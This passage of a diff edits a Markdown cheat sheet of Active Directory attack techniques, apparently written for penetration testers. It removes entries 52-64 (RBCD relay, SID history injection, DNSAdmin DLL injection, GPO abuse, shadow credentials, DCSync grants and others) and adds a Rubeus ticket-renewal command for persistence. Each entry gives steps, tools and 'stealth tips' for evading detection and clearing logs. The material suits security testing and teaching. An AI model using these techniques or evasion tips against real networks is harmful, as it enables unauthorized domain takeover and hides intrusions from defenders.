-- **How to Test**: Target service accounts with SPNs and high privileges.  
-- **Tools**: Rubeus, hashcat, john  
-- **Stealth Tips**: Use selective SPN targeting to avoid noise.  
-
-</details>
-<a name="printer-bug-%2B-rbcd"></a>
-<details>
-  <summary><strong>52. Printer Bug + RBCD</strong></summary>
-
-- **Purpose**: Use printer bug to coerce authentication, then relay to abuse RBCD.  
-- **Functionality**: Triggers an SMB authentication from target system to relay point.  
-- **Why It's Vulnerable**: Trigger bug using SpoolSample and relay via ntlmrelayx to configure RBCD.  
-- **How to Test**: Exploit chain for lateral movement without direct DA rights.  
-- **Tools**: SpoolSample, ntlmrelayx, impacket  
-- **Stealth Tips**: Clean up delegation attributes post-access.  
-
-</details>
-<a name="kerberos-sid-filtering-bypass"></a>
-<details>
-  <summary><strong>53. Kerberos SID Filtering Bypass</strong></summary>
-
-- **Purpose**: Exploit SID history to escalate across trusted domains.  
-- **Functionality**: SID Filtering is bypassed in certain trust configurations.  
-- **Why It's Vulnerable**: Add high-priv SID to SIDHistory in child domain user account.  
-- **How to Test**: Authenticate as user and inherit elevated rights in parent domain.  
-- **Tools**: Mimikatz, DCShadow, PowerShell  
-- **Stealth Tips**: Requires external trust config understanding and careful SID injection.  
-
-</details>
-<a name="as-rep-roasting-%28aes-variant%29"></a>
-<details>
-  <summary><strong>54. AS-REP Roasting (AES Variant)</strong></summary>
-
-- **Purpose**: Request encrypted AS-REP responses for users without pre-auth using AES.  
-- **Functionality**: Stronger encryption requires updated tools and cracking techniques.  
-- **Why It's Vulnerable**: Use Rubeus or GetNPUsers.py with AES output flag.  
-- **How to Test**: Crack using hashcat with mode 18200.  
-- **Tools**: Rubeus, Impacket, hashcat  
-- **Stealth Tips**: Avoid brute-forcing strong passwords; target weak naming conventions.  
-
-</details>
-<a name="dnsadmin-to-dc-compromise"></a>
-<details>
-  <summary><strong>55. DNSAdmin to DC Compromise</strong></summary>
-
-- **Purpose**: Use DNSAdmin rights to execute commands as SYSTEM on DC running DNS service.  
-- **Functionality**: DNSAdmin has permission to modify service DLL path used by DNS server.  
-- **Why It's Vulnerable**: Identify users/groups with DNSAdmin rights and inject malicious DLL.  
-- **How to Test**: Restart DNS service or wait for reboot to trigger DLL execution.  
-- **Tools**: PowerView, dnscmd, sc.exe  
-- **Stealth Tips**: Limit visibility by restoring original DLL path quickly post-access.  
-
-</details>
-<a name="abusing-acl-on-gpo"></a>
-<details>
-  <summary><strong>56. Abusing ACL on GPO</strong></summary>
-
-- **Purpose**: Modify Group Policy Object to execute payload on linked systems.  
-- **Functionality**: Write rights on GPO lets attacker change scripts or registry settings.  
-- **Why It's Vulnerable**: Identify GPOs linked to OUs with high-priv systems using SharpGPOAbuse.  
-- **How to Test**: Inject startup script or Scheduled Task via GPO.  
-- **Tools**: SharpGPOAbuse, gpmc.msc  
-- **Stealth Tips**: Use fake GPO name or cleanup entries to avoid detection.  
-
-</details>
-<a name="shadow-credentials-%28key-credential-link-attack%29"></a>
-<details>
-  <summary><strong>57. Shadow Credentials (Key Credential Link Attack)</strong></summary>
-
-- **Purpose**: Forge key credentials to authenticate as high-priv user.  
-- **Functionality**: Attacker sets alternate credentials (certificate) if write access to user object.  
-- **Why It's Vulnerable**: Add KeyCredential to user object and perform certificate authentication.  
-- **How to Test**: Use Whisker or targeted scripts to register certificate.  
-- **Tools**: Whisker, Certify, Rubeus  
-- **Stealth Tips**: Requires cleanup of certificate mapping from user object.  
-
-</details>
-<a name="exchange-privesc-via-writedacl"></a>
-<details>
-  <summary><strong>58. Exchange PrivEsc via WriteDacl</strong></summary>
-
-- **Purpose**: Abuse Exchange permissions to escalate to domain admin.  
-- **Functionality**: Exchange groups often have excessive rights in domain.  
-- **Why It's Vulnerable**: Identify Exchange Trusted Subsystem and grant DCSync rights to user.  
-- **How to Test**: Perform DCSync after granting Replication rights.  
-- **Tools**: PowerView, Mimikatz  
-- **Stealth Tips**: Ensure Exchange permissions are restored after access.  
-
-</details>
-<a name="readgmsapassword-for-privilege-escalation"></a>
-<details>
-  <summary><strong>59. ReadGMSAPassword for Privilege Escalation</strong></summary>
-
-- **Purpose**: Read Group Managed Service Account (gMSA) password hash.  
-- **Functionality**: Users with read access to gMSA passwords can impersonate services.  
-- **Why It's Vulnerable**: Query gMSA password using PowerShell or Mimikatz.  
-- **How to Test**: Use hash for Overpass-the-Hash or service impersonation.  
-- **Tools**: Mimikatz, PowerShell, Get-ADServiceAccount  
-- **Stealth Tips**: Limit access to gMSAs and rotate credentials regularly.  
-
-</details>
-<a name="kerberos-delegation-loop"></a>
-<details>
-  <summary><strong>60. Kerberos Delegation Loop</strong></summary>
-
-- **Purpose**: Create circular delegation paths to escalate privileges silently.  
-- **Functionality**: Poorly configured delegation allows infinite loops via chained access.  
-- **Why It's Vulnerable**: Analyze delegation paths using BloodHound or AD Explorer.  
-- **How to Test**: Exploit loop to impersonate privileged accounts through chained delegation.  
-- **Tools**: BloodHound, Rubeus, PowerView  
-- **Stealth Tips**: Avoid noisy paths and clean misconfigured delegation entries.  
-
-</details>
-<a name="abuse-service-principal-name-%28spn%29-via-resource-based-constrained-delegation"></a>
-<details>
-  <summary><strong>61. Abuse Service Principal Name (SPN) via Resource-based Constrained Delegation</strong></summary>
-
-- **Purpose**: Target SPN-registered objects to gain RBCD over a service.  
-- **Functionality**: Improper ACLs on service objects allow attacker-controlled computer to configure delegation.  
-- **Why It's Vulnerable**: Create a computer object and configure msDS-AllowedToActOnBehalfOfOtherIdentity.  
-- **How to Test**: Use S4U2self + S4U2proxy to impersonate user to target service.  
-- **Tools**: Rubeus, PowerView, SetSPN  
-- **Stealth Tips**: Clean up computer object and delegation attributes post-access.  
-
-</details>
-<a name="malicious-gpo-deployment"></a>
-<details>
-  <summary><strong>62. Malicious GPO Deployment</strong></summary>
-
-- **Purpose**: Deploy a malicious GPO to linked OU to gain persistence or escalate.  
-- **Functionality**: Write access to GPO or linked OU enables this abuse.  
-- **Why It's Vulnerable**: Craft GPO with startup script, task scheduler or backdoor setting.  
-- **How to Test**: Link GPO to target OU using ADSI or GPMC tools.  
-- **Tools**: SharpGPOAbuse, gpmc.msc, ADSI  
-- **Stealth Tips**: Remove GPO or restore original policy post-operation.  
-
-</details>
-<a name="kerberos-constrained-delegation-%28kcd%29-abuse"></a>
-<details>
-  <summary><strong>63. Kerberos Constrained Delegation (KCD) Abuse</strong></summary>
-
-- **Purpose**: Impersonate users to services using S4U2self and S4U2proxy with KCD.  
-- **Functionality**: Requires delegation rights on target service account.  
-- **Why It's Vulnerable**: Configure computer or user with msDS-AllowedToDelegateTo to impersonate.  
-- **How to Test**: Use forged ticket to access service on behalf of privileged user.  
-- **Tools**: Rubeus, PowerView  
-- **Stealth Tips**: Target services with sensitive permissions only; clear logs.  
-
-</details>
-<a name="unquoted-service-path-privilege-escalation"></a>
-<details>
-  <summary><strong>64. Unquoted Service Path Privilege Escalation</strong></summary>
-
-- **Purpose**: Exploit unquoted service path to execute malicious binary as SYSTEM.  
-- **Functionality**: Service with unquoted path and spaces can lead to execution of attacker binary.  
-- **Why It's Vulnerable**: Find services with unquoted paths using PowerUp.  
-- **How to Test**: Place malicious executable in writable path portion.  
-- **Tools**: PowerUp, sc.exe, accesschk.exe  
-- **Stealth Tips**: Requires service restart; cleanup dropped files post-escalation.  
-
+- **Purpose**: Persist access by renewing TGT indefinitely  
+- **Functionality**: Create long-lifetime ticket and keep renewing  
+- **Why It's Vulnerable**: Policy allows long ticket lifetimes  
+- **How to Test**:
+```powershell
+Rubeus renew /ticket:<kirbi>
+```
+- **Tools**: Rubeus  
+- **Stealth Tips**: Fly under radar with long-term access  
 </details>
